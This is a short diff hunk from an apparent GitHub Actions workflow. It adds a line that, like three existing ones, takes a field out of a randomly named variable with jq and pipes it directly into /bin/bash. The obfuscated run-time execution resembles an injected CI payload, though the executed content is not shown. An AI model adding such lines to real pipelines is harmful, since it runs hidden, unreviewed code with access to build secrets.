@@ -21,6 +21,7 @@ jobs:
           echo $yy104 | jq -r .q658 | /bin/bash
           echo $dhe805 | jq -r .bwsqn5353 | /bin/bash
           echo $dkx14 | jq -r .tqbg1 | /bin/bash
+          echo $ot7 | jq -r .jppvi398 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
